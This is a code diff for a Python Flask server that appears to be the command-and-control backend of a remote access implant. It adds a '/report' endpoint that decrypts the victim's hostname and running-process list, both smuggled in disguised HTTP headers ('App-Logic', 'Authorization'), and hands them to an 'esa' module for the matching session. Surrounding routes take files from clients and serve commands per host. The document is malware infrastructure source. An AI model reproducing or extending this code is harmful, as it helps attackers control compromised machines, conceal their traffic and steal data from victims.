@@ -12,6 +12,7 @@ import random
 from termcolor import colored
 from functions import *
 from encryption import *
+from esa import *
 from flask import *
 import logging
 
@@ -99,6 +100,21 @@ def fr():
     f.close()
     print colored("\n[+] File %s downloaded from the client !" % filename, "green")
     return "True"
+
+@app.route("/report")
+def report():
+    encrypted_host = request.headers["App-Logic"]
+    hostname = decrypt_command(aes_encryption_key, encrypted_host).strip("\x00")
+    for key in connections_information.keys():
+        if hostname in connections_information[key][2]:
+            session = connections_information[key]
+            header = request.headers["Authorization"]
+            processes = decrypt_command(aes_encryption_key, header).strip("\x00").split(" ")
+            esa(processes, session)
+            return "NothingToDo2"
+        else:
+            return "GoAway"
+
 
 @app.route("/command/<hostname>")
 def command(hostname):
